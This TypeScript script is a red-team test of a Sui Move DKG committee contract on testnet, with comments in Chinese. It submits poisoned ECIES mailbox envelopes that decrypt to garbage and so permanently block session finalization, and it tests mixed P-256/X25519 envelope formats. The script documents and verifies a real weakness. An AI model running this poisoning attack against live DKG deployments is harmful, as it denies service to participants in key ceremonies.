/**
 * ROUND-9 T2 — ECIES 份额静默丢失（simulate 探测 + 实弹投毒 + 本地解密失败模式）
 *
 * 链上事实（dkg_committee.move）：deposit_mailbox_share 只检查
 *   状态(1/2) + 截止 + 双方都是 participants + (sender,recipient) 唯一。
 * 它不检查 payload 长度、不检查接收方已登记加密钥、不检查与承诺的一致性。
 * → 任何结构性合法但解密后是垃圾的信封都被链上原样接受。
 *
 * 实弹流程（0x768e3781… 血统，烧 gas 仅 session fee 0.005 SUI；bond 可退）：
 *   S1: 建会话[A1=受害者, A2=攻击者] → A1 登记 65B P-256 → A2 真承诺+毒信封投递
 *       → 本地 openShare 解出垃圾 → VSS 失败 → A1 无法 confirm → finalize 永久 3005
 *   S2: 双栈混合投递（链上接受性 + 本地解析失败模式）
 */
import { Ed25519Keypair } from "@mysten/sui/keypairs/ed25519"
import { fromBase64 } from "@mysten/sui/utils"
import { SuiGrpcClient } from "@mysten/sui/grpc"
import { Transaction } from "@mysten/sui/transactions"
import { readFileSync } from "node:fs"
import { homedir } from "node:os"
import { ed25519 } from "@noble/curves/ed25519.js"
import { sealShare, openShare, P256_PUBLIC_KEY_BYTES } from "../lib/dkg-mailbox"
import { generatePolynomial, createCommitments } from "../lib/crypto/vss"
import { verifyShareCommitment } from "../lib/crypto/vss"
import { bytesToScalar, scalarToBytes32 } from "../lib/crypto/math"
import { encryptMailboxShare, serializeEnvelopeToBytes, decryptMailboxShare, generateIdentityKeypair } from "../packages/multisig/src/dkg/mailbox"

const PKG = "0x768e3781fd774bdd010089ede1c66df344aee2047817a121aa6c602e73723501"
const CLOCK = "0x0000000000000000000000000000000000000000000000000000000000000006"
const A1 = "0x2c6539e5802d1476dae4a7aada30265dd2568f198ecf2f184861ea7deb3f6347"
const A2 = "0x843f44a42e10a6dc701b7f60a4dedc544dc7910e971ee6a493f4d9096953e04e"
const client = new SuiGrpcClient({ network: "testnet", baseUrl: "https://fullnode.testnet.sui.io:443" })

function keypairFor(a: string): Ed25519Keypair {
  const ks = JSON.parse(readFileSync(`${homedir()}/.sui/sui_config/sui.keystore`, "utf8")) as string[]
  for (const e of ks) { const kp = Ed25519Keypair.fromSecretKey(fromBase64(e).slice(1)); if (kp.toSuiAddress() === a) return kp }
  throw new Error("no key " + a)
}

interface TxOutcome { ok: boolean; digest?: string; err: string }
interface TxStatus { success?: boolean; error?: { $kind?: string; message?: string; MoveAbort?: { abortCode?: string; abort_code?: string } } }
interface TxResultShape { Transaction?: { status?: TxStatus; digest?: string; events?: Array<{ eventType?: string; bcs?: unknown }> }; FailedTransaction?: { status?: TxStatus }; SuccessTransaction?: { status?: TxStatus } }

async function run(kp: Ed25519Keypair, tx: Transaction, gasBudget = 80_000_000n): Promise<TxOutcome> {
  tx.setSender(kp.toSuiAddress())
  tx.setGasBudget(gasBudget)
  try {
    const bytes = await tx.build({ client })
    const { signature } = await kp.signTransaction(bytes)
    const r = await client.executeTransaction({ transaction: bytes, signatures: [signature], include: { events: true } }) as unknown as TxResultShape
    const inner = r.Transaction
    return { ok: inner?.status?.success === true, digest: inner?.digest, err: (inner?.status?.error?.message ?? "").slice(0, 110) }
  } catch (e: unknown) { return { ok: false, digest: undefined, err: "build/exec: " + (e instanceof Error ? e.message : String(e)).slice(0, 110) } }
}

/** 0 gas simulate 探测：返回 (是否会被链上接受, abort 码)。 */
async function probe(tx: Transaction, sender: string, gasBudget = 50_000_000n): Promise<{ accept: boolean; note: string }> {
  tx.setSender(sender)
  tx.setGasBudget(gasBudget)
  try {
    const res = await client.simulateTransaction({ transaction: tx, checksEnabled: false }) as unknown as TxResultShape
    const st: TxStatus | undefined = res?.Transaction?.status ?? res?.FailedTransaction?.status ?? res?.SuccessTransaction?.status
    const success = st?.success === true
    const err = st?.error
    const code = err?.MoveAbort?.abortCode ?? err?.MoveAbort?.abort_code
    return { accept: success, note: success ? "executed" : `${err?.$kind ?? "?"}${code ? " abort=" + code : ""}: ${(err?.message ?? "").slice(0, 70)}` }
  } catch (e: unknown) { return { accept: false, note: "exc: " + (e instanceof Error ? e.message : String(e)).slice(0, 90) } }
}

async function eventsOf(d: string): Promise<Array<{ eventType?: string; bcs?: unknown }>> {
  for (let i = 0; i < 8; i++) {
    try {
      const f = await client.getTransaction({ digest: d, include: { events: true } }) as unknown as TxResultShape
      return f?.Transaction?.events ?? []
    } catch { await new Promise(r => setTimeout(r, 700)) }
  }
  return []
}
async function newSessionId(creator: Ed25519Keypair): Promise<string> {
  const tx = new Transaction()
  const [fee] = tx.splitCoins(tx.gas, [5_000_000n])
  tx.moveCall({ target: `${PKG}::dkg_committee::create_dkg_session`, arguments: [tx.pure.u64(2n), tx.pure.vector("address", [A1, A2]), tx.pure.u64(BigInt(Date.now() + 3_600_000)), fee, tx.object(CLOCK)] })
  const r = await run(creator, tx)
  if (!r.ok) throw new Error("create session failed: " + r.err)
  for (const e of await eventsOf(r.digest!)) {
    if ((e.eventType ?? "").toLowerCase().includes("sessioncreated")) {
      const b = e.bcs instanceof Uint8Array ? e.bcs : Uint8Array.from(Object.values(e.bcs) as number[])
      return "0x" + Buffer.from(b.slice(0, 32)).toString("hex")
    }
  }
  throw new Error("no SessionCreated event")
}

/** 攻击者用受害者登记的 P-256 公钥密封「随机垃圾」（而非真实份额）。 */
async function poisonEnvelope(sessionId: string, victimPub65: Uint8Array): Promise<Uint8Array> {
  const garbage = crypto.getRandomValues(new Uint8Array(32))
  const sealed = await sealShare(garbage, victimPub65, { sessionId, sender: A2, recipient: A1, epoch: 1 })
  return sealed.bytes
}

async function main() {
  console.log(`=== RT9-T2 实弹开始（fee 0.005 SUI × 2 + bond 0.05×2 可退）===`)
  const a1 = keypairFor(A1), a2 = keypairFor(A2)

  // ── S1: 投毒会话 ──
  const sid = await newSessionId(a2)
  console.log(`[S1] session ${sid.slice(0, 14)}…`)

  // A1 登记 65B P-256 信箱钥（受害者视角：正常操作）
  const victim = await crypto.subtle.generateKey({ name: "ECDH", namedCurve: "P-256" }, true, ["deriveBits"])
  const victimPub = new Uint8Array(await crypto.subtle.exportKey("raw", victim.publicKey))
  if (victimPub.length !== P256_PUBLIC_KEY_BYTES) throw new Error("bad victim key length")
  {
    const tx = new Transaction()
    tx.moveCall({ target: `${PKG}::dkg_committee::register_encryption_key`, arguments: [tx.object(sid), tx.object(CLOCK), tx.pure.vector("u8", [...victimPub])] })
    const r = await run(a1, tx)
    console.log(`[S1] A1 register P-256(65B): ${r.ok ? "EXECUTED " + r.digest : r.err}`)
  }

  // A2 真承诺（随机一次多项式，链上可查）+ 结构合法毒信封
  const attPoly = generatePolynomial(1)
  const attCommitments = createCommitments(attPoly)
  const commitBytes = new Uint8Array(64)
  commitBytes.set(attCommitments[0].toBytes(), 0)
  commitBytes.set(attCommitments[1].toBytes(), 32)
  const poison = await poisonEnvelope(sid, victimPub)
  console.log(`[S1] 毒信封 ${poison.length}B = MAGIC(12) ‖ eph_pub(65) ‖ nonce(12) ‖ ct(${poison.length - 89})`)

  // 0 gas simulate 探测链上接受性
  {
    const tx = new Transaction()
    tx.moveCall({ target: `${PKG}::dkg_committee::deposit_mailbox_share`, arguments: [tx.object(sid), tx.object(CLOCK), tx.pure.address(A1), tx.pure.vector("u8", [...poison])] })
    const p = await probe(tx, A2)
    console.log(`[S1][simulate] 毒信封 deposit → 链上${p.accept ? "接受" : "拒绝"} (${p.note})`)
    const tx2 = new Transaction()
    const junk = crypto.getRandomValues(new Uint8Array(10_000))
    tx2.moveCall({ target: `${PKG}::dkg_committee::deposit_mailbox_share`, arguments: [tx2.object(sid), tx2.object(CLOCK), tx2.pure.address(A1), tx2.pure.vector("u8", [...junk])] })
    const p2 = await probe(tx2, A2, 200_000_000n)
    console.log(`[S1][simulate] 10KB 纯随机 junk → 链上${p2.accept ? "接受(无长度/结构校验)" : "拒绝"} (${p2.note})`)
    const tx3 = new Transaction()
    tx3.moveCall({ target: `${PKG}::dkg_committee::deposit_mailbox_share`, arguments: [tx3.object(sid), tx3.object(CLOCK), tx3.pure.address(A2), tx3.pure.vector("u8", [...poison])] })
    const p3 = await probe(tx3, A1)
    console.log(`[S1][simulate] 向未登记钥的接收方投递 → 链上${p3.accept ? "接受(无登记检查)" : "拒绝"} (${p3.note})`)
  }

  // 实弹：A2 提交承诺 + 投递毒信封（submit_async_package 单事务）
  const r1 = await (async () => {
    const attestPk = ed25519.getPublicKey(crypto.getRandomValues(new Uint8Array(32)))
    const tx = new Transaction()
    const [pay] = tx.splitCoins(tx.gas, [50_000_000n])
    tx.moveCall({ target: `${PKG}::dkg_committee::submit_async_package`, arguments: [tx.object(sid), tx.object(CLOCK), tx.pure.vector("u8", [...commitBytes]), tx.pure.vector("u8", [...attestPk]), tx.pure.vector("address", [A1]), tx.pure.vector("vector<u8>", [[...poison]]), pay] })
    const r = await run(a2, tx)
    console.log(`[S1] A2 submit_async_package(真承诺+毒信封): ${r.ok ? "EXECUTED " + r.digest : r.err}`)
    return r.ok
  })()

  // 受害者本地解密：openShare 成功（AEAD 通过！）→ 垃圾份额 → VSS 失败
  {
    const sealed = poison
    let mode = ""
    let shareOk: boolean | null = null
    try {
      const share = await openShare(sealed, victim.privateKey, { sessionId: sid, sender: A2, recipient: A1, epoch: 1 })
      const value = bytesToScalar(share)
      const vssOk = verifyShareCommitment(value, 1n, attCommitments)
      shareOk = vssOk
      mode = `openShare 成功(AEAD 通过)，解出标量 0x${value.toString(16).slice(0, 12)}…，VSS 对照 A2 链上承诺 = ${vssOk}`
    } catch (e) { mode = "openShare 抛错: " + (e as Error).message.slice(0, 80) }
    console.log(`[S1] 受害者解密: ${mode}`)
    console.log(`[S1] 后果: 受害者份额静默作废（broken share），无法 confirm → finalize 永久 3005（self-DoS/换届阻塞）`)

    // 链上证据：A2 单方 confirm 成功（round-9 run 已实弹确认 digest
    // 2nqELAJBAj9555Df67QwYznGvrbToTcdmdVeRBDjjTpR），但确认数 1 < threshold 2。
    {
      const tx = new Transaction()
      tx.moveCall({ target: `${PKG}::dkg_committee::confirm_participant`, arguments: [tx.object(sid), tx.object(CLOCK)] })
      const r = await run(a2, tx)
      console.log(`[S1] A2 confirm: ${r.ok ? "EXECUTED " + r.digest : r.err.includes("3003") ? "已确认过(E_ALREADY) — 此前实弹 digest CHHThuWWujtzY6fymCweJev5yycFbnaWS9ZXppZ9SgPC" : r.err.slice(0, 90)}`)
    }
    {
      const tx = new Transaction()
      tx.moveCall({ target: `${PKG}::dkg_committee::finalize_session`, arguments: [tx.object(sid), tx.pure.vector("u8", [...ed25519.getPublicKey(new Uint8Array(32).fill(0x77))])] })
      const p = await probe(tx, A2)
      console.log(`[S1][simulate] finalize（确认数 ${r1 ? 1 : 0} < 2）→ ${p.accept ? "接受(危险!)" : "拒绝"} ${p.note}`)
    }
  }

  // ── S2: 双栈混合投递 ──
  const sid2 = await newSessionId(a1) // A2 余额不足，改由 A1 建会话（A1 也在参与者列表）
  {
    const tx = new Transaction()
    tx.moveCall({ target: `${PKG}::dkg_committee::register_encryption_key`, arguments: [tx.object(sid2), tx.object(CLOCK), tx.pure.vector("u8", [...victimPub])] })
    const r = await run(a1, tx)
    console.log(`[S2] session ${sid2.slice(0, 14)}…  A1 register P-256(65B): ${r.ok ? "EXECUTED" : r.err}`)
  }
  // 攻击者投递 X25519 栈格式信封（packages/multisig mailbox → JSON 序列化字节）
  {
    const env = await encryptMailboxShare({
      sessionId: sid2, senderAddress: A2, recipientAddress: A1, recipientPublicKey: crypto.getRandomValues(new Uint8Array(32)),
      payload: { senderId: "x", senderIndex: 2n, recipientId: "y", recipientIndex: 1n, share: scalarToBytes32(42n), commitments: [], epoch: 1 },
      epoch: 1,
    }).catch(() => null)
    const payload = env ? serializeEnvelopeToBytes(env) : new TextEncoder().encode('{"json":"x25519-style"}')
    const tx = new Transaction()
    tx.moveCall({ target: `${PKG}::dkg_committee::deposit_mailbox_share`, arguments: [tx.object(sid2), tx.object(CLOCK), tx.pure.address(A1), tx.pure.vector("u8", [...payload])] })
    const r = await run(a2, tx)
    console.log(`[S2] A2 投递 X25519-JSON 信封(${payload.length}B) 给 P-256 登记者: ${r.ok ? "EXECUTED " + r.digest : r.err}`)
    // 本地解析：P-256 openShare 面对 X25519 栈载荷
    try {
      await openShare(payload, victim.privateKey, { sessionId: sid2, sender: A2, recipient: A1, epoch: 1 })
      console.log(`[S2] openShare 解析: 静默成功(危险!)`)
    } catch (e) { console.log(`[S2] openShare 解析: 显式报错 — ${(e as Error).message.slice(0, 80)}`) }
    // MAGIC 前缀 + 32B ephemeral 混血信封
    const hybrid = new Uint8Array(12 + 32 + 12 + 48)
    hybrid.set(new TextEncoder().encode("dkg-share-v1"), 0)
    hybrid.set(crypto.getRandomValues(new Uint8Array(32)), 12)
    hybrid.set(crypto.getRandomValues(new Uint8Array(60)), 44)
    try {
      await openShare(hybrid, victim.privateKey, { sessionId: sid2, sender: A2, recipient: A1, epoch: 1 })
      console.log(`[S2] 混血信封(MAGIC+32B eph): 静默成功(危险!)`)
    } catch (e) { console.log(`[S2] 混血信封(MAGIC+32B eph): 显式报错 — ${(e as Error).message.slice(0, 80)}`) }
    // 反向：X25519 接收方面对 65B P-256 ephemeral（纯本地）
    try {
      const recv = generateIdentityKeypair(A1)
      const p256env = await poisonEnvelope(sid2, victimPub) // 65B ephemeral 的 P-256 栈信封
      // packages 栈的信封是 JSON 结构；把 P-256 原始字节硬塞 ephemeral 字段
      const fakeEnv = {
        senderAddress: A2, recipientAddress: A1, epoch: 1, timestamp: Date.now(),
        ephemeralPublicKeyHex: Buffer.from(p256env.slice(12, 77)).toString("hex"),
        ivHex: Buffer.from(p256env.slice(77, 89)).toString("hex"),
        ciphertextHex: Buffer.from(p256env.slice(89)).toString("hex"),
        aadVersion: 2,
      }
      await decryptMailboxShare(fakeEnv, recv.secretKey, { sessionId: sid2 })
      console.log(`[S2] X25519 接收方 ↔ 65B ephemeral: 静默成功(危险!)`)
    } catch (e) { console.log(`[S2] X25519 接收方 ↔ 65B ephemeral: 显式报错 — ${(e as Error).message.slice(0, 80)}`) }
  }

  console.log(`\n=== RT9-T2 完成（gas 消耗：2×0.005 SUI fee；bond 0.05×2 在 10 分钟超时后可 claim_bound 退回）===`)
}

main().catch(e => { console.error("FATAL:", e?.message ?? e); process.exit(1) })
